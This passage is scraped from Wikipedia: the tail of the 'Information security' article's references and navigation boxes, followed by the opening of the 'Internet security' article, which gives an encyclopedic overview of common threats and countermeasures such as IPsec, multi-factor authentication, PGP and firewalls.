"Certain Old and Lovely Things, Whose Signified Is Abstract, Out of Date": James Stirling and Nostalgia"
. 
Change over Time
. 
3
 (1): 116–135. 
doi
:
10.1353/cot.2013.0000
. 
ISSN
 
2153-0548
. 
S2CID
 
144451363
.




^
 
Ahwidy, Mansour; Pemberton, Lyn (2016). 
"What Changes Need to be Made within the LNHS for Ehealth Systems to be Successfully Implemented?"
. 
Proceedings of the International Conference on Information and Communication Technologies for Ageing Well and e-Health
. Scitepress. pp. 71–79. 
doi
:
10.5220/0005620400710079
. 
ISBN
 
978-989-758-180-9
.




^
 
Mortimer, John (April 2010). 
Paradise postponed
. Penguin Adult. 
ISBN
 
978-0-14-104952-6
. 
OCLC
 
495596392
.




^ 
a
 
b
 
Cobey, Sarah; Larremore, Daniel B.; Grad, Yonatan H.; Lipsitch, Marc (2021). 
"Concerns about SARS-CoV-2 evolution should not hold back efforts to expand vaccination"
. 
Nature Reviews Immunology
. 
21
 (5): 330–335. 
doi
:
10.1038/s41577-021-00544-9
. 
PMC
 
8014893
. 
PMID
 
33795856
.




^
 
Frampton, Michael (December 26, 2014), 
"Processing Data with Map Reduce"
, 
Big Data Made Easy
, Berkeley, CA: Apress, pp. 85–120, 
doi
:
10.1007/978-1-4842-0094-0_4
, 
ISBN
 
978-1-4842-0095-7
, retrieved 
June 5,
 2021




^
 
"Good study overall, but several procedures need fixing"
 
(PDF)
. 
Hydrology and Earth System Sciences Discussions
. February 23, 2016. 
doi
:
10.5194/hess-2015-520-rc2
. Retrieved 
January 18,
 2022
.




^
 
Harrison, Kent; Craft, Walter M.; Hiller, Jack; McCluskey, Michael R.; BDM Federal Inc Seaside CA (July 1996). 
"Peer Review Coordinating Draft. Task Analysis for Conduct Intelligence Planning (Critical Combat Function 1): As Accomplished by a Battalion Task Force"
. 
DTIC
 
ADA313949
.




^
 
itpi.org
 
Archived
 December 10, 2013, at the 
Wayback Machine




^
 
"book summary of The Visible Ops Handbook: Implementing ITIL in 4 Practical and Auditable Steps"
. wikisummaries.org
. Retrieved 
June 22,
 2016
.




^
 
Bigelow, Michelle (September 23, 2020), 
"Change Control and Change Management"
, 
Implementing Information Security in Healthcare
, HIMSS Publishing, pp. 203–214, 
doi
:
10.4324/9781003126294-17
, 
ISBN
 
978-1-003-12629-4
, 
S2CID
 
224866307
, retrieved 
June 5,
 2021




^
 
Business continuity management. Guidance on organization recovery following disruptive incidents
, BSI British Standards, 
doi
:
10.3403/30194308
, retrieved 
June 5,
 2021




^
 
Hoanh, Chu Thai (1996). 
Development of a computerized aid to integrated land use planning (cailup) at regional level in irrigated areas : a case study for the Quan Lo Phung Hiep region in the Mekong Delta, Vietnam
. ITC. 
ISBN
 
90-6164-120-9
. 
OCLC
 
906763535
.




^
 
1
Hibberd, Gary (September 11, 2015), 
"Developing a BCM Strategy in Line with Business Strategy"
, 
The Definitive Handbook of Business Continuity Management
, Hoboken, NJ, US: John Wiley & Sons, Inc., pp. 23–30, 
doi
:
10.1002/9781119205883.ch2
, 
ISBN
 
978-1-119-20588-3
, retrieved 
June 5,
 2021




^
 
Hotchkiss, Stuart (2010). 
Business Continuity Management: In Practice
. BCS Learning & Development Limited. 
ISBN
 
978-1-906124-72-4
.
[
page needed
]




^
 
"Identifying Potential Failure Causes"
, 
Systems Failure Analysis
, ASM International, pp. 25–33, 2009, 
doi
:
10.31399/asm.tb.sfa.t52780025
, 
ISBN
 
978-1-62708-268-6
, retrieved 
June 5,
 2021




^
 
Clemens, Jeffrey. 
Risks to the returns to medical innovation : the case of myriad genetics
. 
OCLC
 
919958196
.




^
 
Goatcher, Genevieve (2013), 
"Maximum Acceptable Outage"
, 
Encyclopedia of Crisis Management
, Thousand Oaks, CA: SAGE Publications, Inc., 
doi
:
10.4135/9781452275956.n204
, 
ISBN
 
978-1-4522-2612-5
, retrieved 
June 5,
 2021




^
 
"Segment Design Tradeoffs"
, 
Software Radio Architecture
, New York, US: John Wiley & Sons, Inc., pp. 236–243, January 17, 2002, 
doi
:
10.1002/047121664x.ch6
, 
ISBN
 
978-0-471-21664-3
, retrieved 
June 5,
 2021




^
 
Blundell, S. (1998). 
"IN-EMERGENCY - integrated incident management, emergency healthcare and environmental monitoring in road networks"
. 
IEE Seminar Using ITS in Public Transport and in Emergency Services
. Vol. 1998. IEE. p. 9. 
doi
:
10.1049/ic:19981090
.




^
 
King, Jonathan R. (January 1993). 
"Contingency Plans and Business Recovery"
. 
Information Systems Management
. 
10
 (4): 56–59. 
doi
:
10.1080/10580539308906959
. 
ISSN
 
1058-0530
.




^
 
Phillips, Brenda D.; Landahl, Mark (2021), 
"Strengthening and testing your business continuity plan"
, 
Business Continuity Planning
, Elsevier, pp. 131–153, 
doi
:
10.1016/b978-0-12-813844-1.00001-4
, 
ISBN
 
978-0-12-813844-1
, 
S2CID
 
230582246
, retrieved 
June 5,
 2021




^
 
Schnurr, Stephanie (2009), 
"The 'Other' Side of Leadership Discourse: Humour and the Performance of Relational Leadership Activities"
, 
Leadership Discourse at Work
, London: Palgrave Macmillan UK, pp. 42–60, 
doi
:
10.1057/9780230594692_3
, 
ISBN
 
978-1-349-30001-3
, retrieved 
June 5,
 2021




^
 
Specified time relays for industrial use
, BSI British Standards, 
doi
:
10.3403/02011580u
, retrieved 
June 5,
 2021




^
 
"Sample Generic Plan and Procedure: Disaster Recovery Plan (DRP) for Operations/Data Center"
. 
Workplace Violence
. Elsevier. 2010. pp. 253–270. 
doi
:
10.1016/b978-1-85617-698-9.00025-4
. 
ISBN
 
978-1-85617-698-9
. Retrieved 
June 5,
 2021
.




^
 
"Information Technology Disaster Recovery Plan"
. 
Disaster Planning for Libraries
. Chandos Information Professional Series. Elsevier. 2015. pp. 187–197. 
doi
:
10.1016/b978-1-84334-730-9.00019-3
. 
ISBN
 
978-1-84334-730-9
. Retrieved 
June 5,
 2021
.




^
 
"The Disaster Recovery Plan"
. Sans Institute
. Retrieved 
February 7,
 2012
.




^ 
a
 
b
 
OECD (2016). 
"Figure 1.10. Regulations in non-manufacturing sector have significant impact on the manufacturing sector"
. 
Economic Policy Reforms 2016: Going for Growth Interim Report
. Economic Policy Reforms. Paris: OECD Publishing. 
doi
:
10.1787/growth-2016-en
. 
ISBN
 
9789264250079
. Retrieved 
June 5,
 2021
.




^
 
Ahupuaʻa [electronic resource] : World Environmental and Water Resources Congress 2008, May 12-16, 2008, Honolulu, Hawaiʻi
. American Society of Civil Engineers. 2008. 
ISBN
 
978-0-7844-0976-3
. 
OCLC
 
233033926
.




^
 
Great Britain. Parliament. House of Commons (2007). 
Data protection [H.L.] A bill [as amended in standing committee d] intituled an act to make new provision for the regulation of the processing of information relating to individuals, including the obtaining, holding, use or disclosure of such information
. Proquest LLC. 
OCLC
 
877574826
.




^
 
"Data protection, access to personal information and privacy protection"
, 
Government and Information Rights: The Law Relating to Access, Disclosure and their Regulation
, Bloomsbury Professional, 2019, 
doi
:
10.5040/9781784518998.chapter-002
, 
ISBN
 
978-1-78451-896-7
, 
S2CID
 
239376648
, retrieved 
June 5,
 2021




^
 
Lehtonen, Lasse A. (July 5, 2017). 
"Genetic Information and the Data Protection Directive of the European Union"
. 
The Data Protection Directive and Medical Research Across Europe
. Routledge. pp. 103–112. 
doi
:
10.4324/9781315240350-8
. 
ISBN
 
978-1-315-24035-0
. Retrieved 
June 5,
 2021
.




^
 
"Data Protection Act 1998"
. 
legislation.gov.uk
. The National Archives
. Retrieved 
January 25,
 2018
.




^
 
"Computer Misuse Act 1990"
. 
Criminal Law Statutes 2011-2012
. Routledge. June 17, 2013. pp. 114–118. 
doi
:
10.4324/9780203722763-42
. 
ISBN
 
978-0-203-72276-3
. Retrieved 
June 5,
 2021
.




^
 
Dharmapala, Dhammika; Hines, James (December 2006). 
"Which Countries Become Tax Havens?"
. Working Paper Series. Cambridge, MA. 
doi
:
10.3386/w12802
.




^
 
"Figure 1.14. Participation rates have risen but labour force growth has slowed in several countries"
. 
doi
:
10.1787/888933367391
. Retrieved 
June 5,
 2021
.




^
 
"Computer Misuse Act 1990"
. 
legislation.gov.uk
. The National Archives
. Retrieved 
January 25,
 2018
.




^
 
"Directive 2006/24/EC of the European Parliament and of the Council of 15 March 2006"
. 
EUR-Lex
. European Union. March 15, 2006
. Retrieved 
January 25,
 2018
.




^
 
"Defamation, Student Records, and the Federal Family Education Rights and Privacy Act"
. 
Higher Education Law
. Routledge. December 14, 2010. pp. 361–394. 
doi
:
10.4324/9780203846940-22
. 
ISBN
 
978-0-203-84694-0
. Retrieved 
June 5,
 2021
.




^ 
a
 
b
 
"Alabama Schools Receive NCLB Grant To Improve Student Achievement"
. 
PsycEXTRA Dataset
. 2004. 
doi
:
10.1037/e486682006-001
. Retrieved 
June 5,
 2021
.




^
 
Turner-Gottschang, Karen (1987). 
China bound : a guide to academic life and work in the PRC : for the Committee on Scholarly Communication with the People's Republic of China, National Academy of Sciences, American Council of Learned Societies, Social Science Research Council
. National Academy Press. 
ISBN
 
0-309-56739-4
. 
OCLC
 
326709779
.




^
 
Codified at 
20 U.S.C.
 
§ 1232g
, with implementing regulations in title 34, part 99 of the 
Code of Federal Regulations




^
 
"Audit Booklet"
. 
Information Technology Examination Handbook
. FFIEC
. Retrieved 
January 25,
 2018
.




^
 
Ray, Amy W. (2004). 
"Health Insurance Portability and Accountability Act (HIPAA)"
. 
Encyclopedia of Health Care Management
. Thousand Oaks, CA: SAGE Publications, Inc. 
doi
:
10.4135/9781412950602.n369
. 
ISBN
 
978-0-7619-2674-0
. Retrieved 
June 5,
 2021
.




^
 
"Public Law 104 - 191 - Health Insurance Portability and Accountability Act of 1996"
. U.S. Government Publishing Office
. Retrieved 
January 25,
 2018
.




^
 
"Public Law 106 - 102 - Gramm–Leach–Bliley Act of 1999"
 
(PDF)
. U.S. Government Publishing Office
. Retrieved 
January 25,
 2018
.




^
 
Alase, Abayomi Oluwatosin (2016). 
The impact of the Sarbanes-Oxley Act (SOX) on small-sized publicly traded companies and their communities
 (Thesis). Northeastern University Library. 
doi
:
10.17760/d20204801
.




^
 
Solis, Lupita (2019). 
Educational and Professional Trends of Chief Financial Officers
 (Thesis). Portland State University Library. 
doi
:
10.15760/honors.763
.




^
 
"Public Law 107 - 204 - Sarbanes-Oxley Act of 2002"
. U.S. Government Publishing Office
. Retrieved 
January 25,
 2018
.




^
 
"Pci Dss Glossary, Abbreviations, and Acronyms"
, 
Payment Card Industry Data Security Standard Handbook
, Hoboken, NJ, US: John Wiley & Sons, Inc., pp. 185–199, September 18, 2015, 
doi
:
10.1002/9781119197218.gloss
, 
ISBN
 
978-1-119-19721-8
, retrieved 
June 5,
 2021




^
 
"PCI Breakdown (Control Objectives and Associated Standards)"
, 
Payment Card Industry Data Security Standard Handbook
, Hoboken, NJ, US: John Wiley & Sons, Inc., p. 61, September 18, 2015, 
doi
:
10.1002/9781119197218.part2
, 
ISBN
 
978-1-119-19721-8
, retrieved 
June 5,
 2021




^
 
Ravallion, Martin; Chen, Shaohua (August 2017). 
"Welfare-Consistent Global Poverty Measures"
. Working Paper Series. 
doi
:
10.3386/w23739
. Retrieved 
January 18,
 2022
.




^
 
"Payment Card Industry (PCI) Data Security Standard: Requirements and Security Assessment Procedures - Version 3.2"
 
(PDF)
. Security Standards Council. April 2016
. Retrieved 
January 25,
 2018
.




^
 
"Security Breach Notification Laws"
. National Conference of State Legislatures. April 12, 2017
. Retrieved 
January 25,
 2018
.




^
 
Stein, Stuart G.; Schaberg, Richard A.; Biddle, Laura R., eds. (June 23, 2015). 
Financial institutions answer book, 2015 : law, governance, compliance
. Practising Law Institute. 
ISBN
 
978-1-4024-2405-2
. 
OCLC
 
911952833
.




^
 
"Personal Information and Data Protection"
, 
Protecting Personal Information
, Hart Publishing, 2019, 
doi
:
10.5040/9781509924882.ch-002
, 
ISBN
 
978-1-5099-2485-1
, 
S2CID
 
239275871
, retrieved 
June 5,
 2021




^
 
Chapter 5. An Act to support and promote electronic commerce by protecting personal information that is collected, used or disclosed in certain circumstances, by providing for the use of electronic means to communicate or record information or transactions and by amending the Canada Evidence Act, the Statutory Instruments Act and the Statute Revision Act
. Queen's Printer for Canada. 2000. 
OCLC
 
61417862
.




^
 
"Comments"
. 
Statute Law Review
. 
5
 (1): 184–188. 1984. 
doi
:
10.1093/slr/5.1.184
. 
ISSN
 
0144-3593
.




^
 
"Personal Information Protection and Electronic Documents Act"
 
(PDF)
. Canadian Minister of Justice
. Retrieved 
January 25,
 2018
.




^
 
Werner, Martin (May 11, 2011). 
"Privacy-protected communication for location-based services"
. 
Security and Communication Networks
. 
9
 (2): 130–138. 
doi
:
10.1002/sec.330
. 
ISSN
 
1939-0114
.




^
 
"Regulation for the Assurance of Confidentiality in Electronic Communications"
 
(PDF)
. 
Government Gazette of the Hellenic Republic
. Hellenic Authority for Communication Security and Privacy. November 17, 2011. Archived from 
the original
 
(PDF)
 on June 25, 2013
. Retrieved 
January 25,
 2018
.




^
 
de Guise, Preston (April 29, 2020), 
"Security, Privacy, Ethical, and Legal Considerations"
, 
Data Protection
, Auerbach Publications, pp. 91–108, 
doi
:
10.1201/9780367463496-9
, 
ISBN
 
978-0-367-46349-6
, 
S2CID
 
219013948
, retrieved 
June 5,
 2021




^
 
"Αριθμ. απόφ. 205/2013"
 
(PDF)
. 
Government Gazette of the Hellenic Republic
. Hellenic Authority for Communication Security and Privacy. July 15, 2013. Archived from 
the original
 
(PDF)
 on February 4, 2019
. Retrieved 
January 25,
 2018
.




^
 
Andersson and Reimers, 2019, CYBER SECURITY EMPLOYMENT POLICY AND WORKPLACE DEMAND IN THE U.S. GOVERNMENT, EDULEARN19 Proceedings, Publication year: 2019 Pages: 7858-7866 
https://library.iated.org/view/ANDERSON2019CYB




^
 
"Definition of Security Culture"
. 
The Security Culture Framework
. April 9, 2014. Archived from 
the original
 on January 27, 2019
. Retrieved 
January 27,
 2019
.




^
 
Roer, Kai; Petric, Gregor (2017). 
The 2017 Security Culture Report - In depth insights into the human factor
. CLTRe North America, Inc. pp. 42–43. 
ISBN
 
978-1544933948
.




^
 
Akhtar, Salman, ed. (March 21, 2018). 
Good Feelings
. Routledge. 
doi
:
10.4324/9780429475313
. 
ISBN
 
9780429475313
.




^
 
Anderson, D., Reimers, K. and Barretto, C. (March 2014). Post-Secondary Education Network Security: Results of Addressing the End-User Challenge.publication date Mar 11, 2014 publication description INTED2014 (International Technology, Education, and Development Conference)




^ 
a
 
b
 
Schlienger, Thomas; Teufel, Stephanie (December 2003). "Information security culture - from analysis to change". 
South African Computer Society (SAICSIT)
. 
2003
 (31): 46–52. 
hdl
:
10520/EJC27949
.




^
 
"IISP Skills Framework"
. Archived from 
the original
 on March 15, 2014
. Retrieved 
April 27,
 2014
.




^
 
"BSI-Standards"
. BSI. Archived from 
the original
 on December 3, 2013
. Retrieved 
November 29,
 2013
.






Further reading
[
edit
]




Anderson, K., "
IT Security Professionals Must Evolve for Changing Market
", 
SC Magazine
, October 12, 2006.


Aceituno, V., "On Information Security Paradigms", 
ISSA Journal
, September 2005.


Easttom, C.
, 
Computer Security Fundamentals (2nd Edition)
 
Pearson Education
, 2011.


Lambo, T., "ISO/IEC 27001: The future of infosec certification", 
ISSA Journal
, November 2006.


Dustin, D., " 
Awareness of How Your Data is Being Used and What to Do About It
", "CDR Blog", May 2017.


Dhillon, G., "
The intellectual core of Information Systems Security
", 
Journal of Information Systems Security
, Vol. 19, No 2.


Bibliography
[
edit
]


Allen, Julia H. (2001). 
The CERT Guide to System and Network Security Practices
. Boston, MA: Addison-Wesley. 
ISBN
 
978-0-201-73723-3
.


Krutz, Ronald L.; Russell Dean Vines (2003). 
The CISSP Prep Guide
 (Gold ed.). Indianapolis, IN: Wiley. 
ISBN
 
978-0-471-26802-4
.


Layton, Timothy P. (2007). 
Information Security: Design, Implementation, Measurement, and Compliance
. Boca Raton, FL: Auerbach publications. 
ISBN
 
978-0-8493-7087-8
.


McNab, Chris (2004). 
Network Security Assessment
. Sebastopol, CA: O'Reilly. 
ISBN
 
978-0-596-00611-2
.


Peltier, Thomas R. (2001). 
Information Security Risk Analysis
. Boca Raton, FL: Auerbach publications. 
ISBN
 
978-0-8493-0880-2
.


Peltier, Thomas R. (2002). 
Information Security Policies, Procedures, and Standards: guidelines for effective information security management
. Boca Raton, FL: Auerbach publications. 
ISBN
 
978-0-8493-1137-6
.


White, Gregory (2003). 
All-in-one Security+ Certification Exam Guide
. Emeryville, CA: McGraw-Hill/Osborne. 
ISBN
 
978-0-07-222633-1
.


Dhillon, Gurpreet (2007). 
Principles of Information Systems Security: text and cases
. NY: John Wiley & Sons. 
ISBN
 
978-0-471-45056-6
.


Whitman, Michael; Mattord, Herbert (2017). 
Principles of Information Security
. 
Cengage
. 
ISBN
 
978-1337102063
.




External links
[
edit
]








Wikimedia Commons has media related to 
Information security
.




DoD IA Policy Chart
 
Archived
 2011-09-06 at the 
Wayback Machine
 on the DoD Information Assurance Technology Analysis Center web site.


patterns & practices Security Engineering Explained


Open Security Architecture- Controls and patterns to secure IT systems


IWS – Information Security Chapter
 
Archived
 2019-11-08 at the 
Wayback Machine


Ross Anderson's book "Security Engineering"


teciza.in


Free ISO 27001 Annex A 5.1 Guidance


v
t
e
Computer science
Note: This template roughly follows the 2012 
ACM Computing Classification System
.
Hardware


Printed circuit board


Peripheral


Integrated circuit


Very Large Scale Integration


Systems on Chip (SoCs)


Energy consumption (Green computing)


Electronic design automation


Hardware acceleration


Processor


Size
 / 
Form


Computer systems organization


Computer architecture


Computational complexity


Dependability


Embedded system


Real-time computing


Networks


Network architecture


Network protocol


Network components


Network scheduler


Network performance evaluation


Network service


Software organization


Interpreter


Middleware


Virtual machine


Operating system


Software quality


Software notations
 and 
tools


Programming paradigm


Programming language


Compiler


Domain-specific language


Modeling language


Software framework


Integrated development environment


Software configuration management


Software library


Software repository


Software development


Control variable


Software development process


Requirements analysis


Software design


Software construction


Software deployment


Software engineering


Software maintenance


Programming team


Open-source model


Theory of computation


Model of computation


Stochastic


Formal language


Automata theory


Computability theory


Computational complexity theory


Logic


Semantics


Algorithms


Algorithm design


Analysis of algorithms


Algorithmic efficiency


Randomized algorithm


Computational geometry


Mathematics of 
computing


Discrete mathematics


Probability


Statistics


Mathematical software


Information theory


Mathematical analysis


Numerical analysis


Theoretical computer science


Information systems


Database management system


Information storage systems


Enterprise information system


Social information systems


Geographic information system


Decision support system


Process control system


Multimedia information system


Data mining


Digital library


Computing platform


Digital marketing


World Wide Web


Information retrieval


Security


Cryptography


Formal methods


Security hacker


Security services


Intrusion detection system


Hardware security


Network security


Information security


Application security


Human–computer interaction


Interaction design


Social computing


Ubiquitous computing


Visualization


Accessibility


Concurrency


Concurrent computing


Parallel computing


Distributed computing


Multithreading


Multiprocessing


Artificial intelligence


Natural language processing


Knowledge representation and reasoning


Computer vision


Automated planning and scheduling


Search methodology


Control method


Philosophy of artificial intelligence


Distributed artificial intelligence


Machine learning


Supervised learning


Unsupervised learning


Reinforcement learning


Multi-task learning


Cross-validation


Graphics


Animation


Rendering


Photograph manipulation


Graphics processing unit


Mixed reality


Virtual reality


Image compression


Solid modeling


Applied computing


Quantum Computing


E-commerce


Enterprise software


Computational mathematics


Computational physics


Computational chemistry


Computational biology


Computational social science


Computational engineering


Differentiable computing


Computational healthcare


Digital art


Electronic publishing


Cyberwarfare


Electronic voting


Video games


Word processing


Operations research


Educational technology


Document management




 
Category


 
Outline


 
Glossaries




v
t
e
Security Type


Application security


Biosecurity


Collective security


Computer security


Control system security


Corporate security


Economic security


Emotional security


Energy security


Event security


Food security


Health security


Information security


Internal security


International security


Job security


National security


Operations security


Physical security


Public security


Social security




Security engineering




v
t
e
Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation




Authority control databases
: National 
Germany
Czech Republic
Latvia










Retrieved from "
https://en.wikipedia.org/w/index.php?title=Information_security&oldid=1246311421
"


Categories
: 
Data security
Security
Crime prevention
National security
Cryptography
Information governance
Hidden categories: 
CS1 maint: DOI inactive as of August 2024
CS1 maint: DOI inactive as of September 2024
Webarchive template wayback links
Wikipedia articles needing page number citations from January 2023
Articles with short description
Short description is different from Wikidata
Use mdy dates from November 2023
Articles containing potentially dated statements from 2013
All articles containing potentially dated statements
All articles with unsourced statements
Articles with unsourced statements from June 2021
Articles with unsourced statements from November 2023
Articles to be expanded from January 2018
All articles to be expanded
Articles with unsourced statements from January 2023
Articles with unsourced statements from December 2023
Commons category link from Wikidata











From Wikipedia, the free encyclopedia






Branch of computer security


This article 
needs additional citations for 
verification
.
 Please help 
improve this article
 by 
adding citations to reliable sources
. Unsourced material may be challenged and removed.
Find sources:
 
"Internet security"
 – 
news
 
·
 
newspapers
 
·
 
books
 
·
 
scholar
 
·
 
JSTOR
 
(
April 2009
)
 (
Learn how and when to remove this message
)


Internet security
 is a branch of 
computer security
. It encompasses the 
Internet
, 
browser security
, web site security,
[
1
]
 and 
network security
 as it applies to other 
applications
 or 
operating systems
 as a whole. Its objective is to establish rules and measures to use against attacks over the Internet.
[
2
]
 The Internet is an inherently 
insecure channel
 for information exchange, with high risk of 
intrusion
 or fraud, such as 
phishing
,
[
3
]
 online 
viruses
, 
trojans
, 
ransomware
 and 
worms
.


Many methods are used to combat these threats, including 
encryption
 and ground-up engineering.
[
4
]


Threats
[
edit
]


Emerging Threats
[
edit
]


Emerging cyberthreats are a result of recent technological breakthroughs. For example, 
deepfakes
 use AI to produce audio and video that seems real but are actually fake, which increases the danger of fraud and false information. Furthermore, traditional risks can be automated and strengthened by AI-driven attacks, making them harder to identify and neutralize.



Malicious software
[
edit
]


Malicious software comes in many forms, such as 
viruses
, 
Trojan horses
, 
spyware
, and worms.



Malware
, a portmanteau of malicious software, is any software used to disrupt computer operation, gather sensitive information, or gain access to private computer systems. Malware is defined by its malicious intent, acting against the requirements of the computer user, and does not include software that unintentionally causes harm due to some deficiency. The term badware applies to both malware and unintentionally harmful software.


A 
botnet
 is a network of 
computers
 that have been taken over by a robot or 
bot
 that performs large-scale malicious acts for its creator.


Computer viruses
 are programs that can replicate their structures or effects by infecting other files or structures on a computer. The typical purpose of a virus is to take over a computer to steal data.


Computer worms
 are programs that can replicate themselves throughout a computer network.


Ransomware
 is a type of malware that restricts access to the computer system that it infects, and demands a ransom in order for the restriction to be removed.


Scareware
 is a program of usually limited or no benefit, containing malicious payloads, that is sold via unethical marketing practices. The selling approach uses social engineering to cause shock, anxiety, or the perception of a threat, generally directed at an unsuspecting user.


Spyware
 refers to programs that surreptitiously monitor activity on a computer system and report that information to others without the user's consent.


One particular kind of spyware is 
key logging
 malware. Often referred to as keylogging or keyboard capturing, is the action of recording (logging) the keys struck on a 
keyboard
.


A 
Trojan horse
, commonly known as a 
Trojan
, is a general term for malware that pretends to be harmless, so that a user will be convinced to download it onto the computer.


Denial-of-service attacks
[
edit
]


Main article: 
Denial-of-service attack


A 
denial-of-service attack
 (DoS) or distributed denial-of-service attack (DDoS) is an attempt to make a computer resource unavailable to its intended users. It works by making so many service requests at once that the system is overwhelmed and becomes unable to process any of them. DoS may target 
cloud computing
 systems.
[
5
]
 According to business participants in an international security survey, 25% of respondents experienced a DoS attack in 2007 and another 16.8% in 2010.
[
citation needed
]
 DoS attacks often use bots (or a botnet) to carry out the attack.



Phishing
[
edit
]


Main article: 
Phishing


Phishing targets online users in an attempt to extract sensitive information such as passwords and financial information.
[
6
]
 Phishing occurs when the attacker pretends to be a trustworthy entity, either via email or a web page. Victims are directed to web pages that appear to be legitimate, but instead route information to the attackers. Tactics such as 
email spoofing
 attempt to make emails appear to be from legitimate senders, or long complex 
URLs
 hide the actual website.
[
7
]
[
8
]
 Insurance group 
RSA
 claimed that phishing accounted for worldwide losses of $10.8 billion in 2016.
[
9
]




Man in the middle
[
edit
]


Main article: 
Man-in-the-middle attack


A man-in-the-middle (MITM) attack is a type of cyber attack. Cybercriminals can intercept data sent between people to steal, eavesdrop or modify data for certain malicious purposes, such as extorting money and 
identity theft
. Public WiFi is often insecure because monitoring or intercepting Web traffic is unknown.
[
citation needed
]




Application vulnerabilities
[
edit
]


Main article: 
Application security


Applications used to access Internet resources may contain security vulnerabilities such as 
memory safety
 bugs or flawed authentication checks. Such bugs can give network attackers full control over the computer.
[
10
]
[
11
]




User Awareness
[
edit
]


As cyberthreats become more complex, user education is essential for improving internet security. Important areas of attention consist of:



Users should have the ability to spot 
phishing
 emails by looking for odd sender addresses, cliched salutations, and language that seems urgent. Both simulated phishing exercises and real-world examples can be incorporated into training programs.


Enabling 
two-factor authentication
 (2FA) and stressing the usage of strong, one-of-a-kind passwords are essential for protecting personal information. Additionally, users need to understand the dangers of oversharing on social media and how crucial it is to change their privacy settings.


It's critical to educate people on how to spot secure websites (search for HTTPS), steer clear of dubious downloads, and use caution when clicking links. Also, users need to be aware of the dangers of utilizing open WiFi networks without a 
VPN
.


Countermeasures
[
edit
]


Network layer security
[
edit
]


TCP/IP
 protocols may be secured with 
cryptographic
 methods and 
security protocols
. These protocols include 
Secure Sockets Layer
 (SSL), succeeded by 
Transport Layer Security
 (TLS) for 
web traffic
, 
Pretty Good Privacy
 (PGP) for email, and 
IPsec
 for network layer security.
[
12
]




Internet Protocol Security (IPsec)
[
edit
]


Main article: 
IPsec


IPsec is designed to protect TCP/IP communication in a secure manner. It is a set of security extensions developed by the 
Internet Engineering Task Force
 (IETF). It provides security and authentication at the IP layer by transforming data using encryption. Two main types of transformation form the basis of IPsec: the 
Authentication Header
 (AH) and 
ESP
. They provide data integrity, data origin authentication, and 
anti-replay
 services. These protocols can be used alone or in combination.

Basic components include:



Security protocols for AH and ESP


Security association for policy management and traffic processing


Manual and automatic key management for the 
Internet key exchange
 (IKE)


Algorithms for 
authentication
 and encryption


The algorithm allows these sets to work independently without affecting other parts of the implementation. The IPsec implementation is operated in a host or security gateway environment giving protection to IP traffic.



Threat modeling
[
edit
]


Threat Modeling tools helps you to proactively analyze the cyber security posture of a system or system of systems and in that way prevent security threats.



Multi-factor authentication
[
edit
]


Main article: 
Multi-factor authentication


Multi-factor authentication
 (MFA) is an 
access control
 method in which a 
user
 is granted access only after successfully presenting separate pieces of evidence to an 
authentication
 mechanism – two or more from the following categories: knowledge (something they know), possession (something they have), and inference (something they are).
[
13
]
[
14
]
 Internet resources, such as websites and email, may be secured using this technique.



Security token
[
edit
]


Main article: 
Security token


Some online sites offer customers the ability to use a six-digit code which randomly changes every 30–60 seconds on a physical 
security token
. The token has built-in computations and manipulates numbers based on the current time. This means that every thirty seconds only a certain array of numbers validate access. The website is made aware of that device's serial number and knows the computation and correct time to verify the number. After 30–60 seconds the device presents a new random six-digit number to log into the website.
[
15
]




Electronic mail security
[
edit
]


Background
[
edit
]


Email
 messages are composed, delivered, and stored in a multiple step process, which starts with the message's composition. When a message is sent, it is transformed into a standard format according to RFC 2822.
[
16
]
 Using a network connection, the mail client sends the sender's identity, the recipient list and the message content to the server. Once the server receives this information, it forwards the message to the recipients.



Pretty Good Privacy (PGP)
[
edit
]


Main article: 
Pretty Good Privacy


Pretty Good Privacy
 provides confidentiality by encrypting messages to be transmitted or data files to be stored using an encryption algorithm such as 
Triple DES
 or 
CAST-128
. Email messages can be protected by using cryptography in various ways, such as the following:



Digitally signing
 the message to ensure its integrity and confirm the sender's identity.


Encrypting the message body of an email message to ensure its confidentiality.


Encrypting the communications between mail servers to protect the confidentiality of both message body and message header.


The first two methods, message signing and message body encryption, are often used together; however, encrypting the transmissions between mail servers is typically used only when two organizations want to protect emails regularly sent between them. For example, the organizations could establish a 
virtual private network
 (VPN) to encrypt communications between their mail servers.
[
17
]
 Unlike methods that only encrypt a message body, a VPN can encrypt all communication over the connection, including email header information such as senders, recipients, and subjects. However, a VPN does not provide a message signing mechanism, nor can it provide protection for email messages along the entire route from sender to recipient.



Message Authentication Code
[
edit
]


Main article: 
Message Authentication Code


A 
Message authentication code
 (MAC) is a cryptography method that uses a 
secret key
 to digitally sign a message. This method outputs a MAC value that can be decrypted by the receiver, using the same secret key used by the sender. The Message Authentication Code protects both a message's 
data integrity
 as well as its 
authenticity
.
[
18
]




Firewalls
[
edit
]


Main article: 
Firewall (computing)


A 
computer firewall
 controls access to a single computer. A network firewall controls access to an entire network. A firewall is a security device — computer hardware or software — that filters traffic and blocks outsiders. It generally consists of gateways and filters. Firewalls can also screen network traffic and block traffic deemed unauthorized.



Web security
[
edit
]


Firewalls restrict incoming and outgoing 
network packets
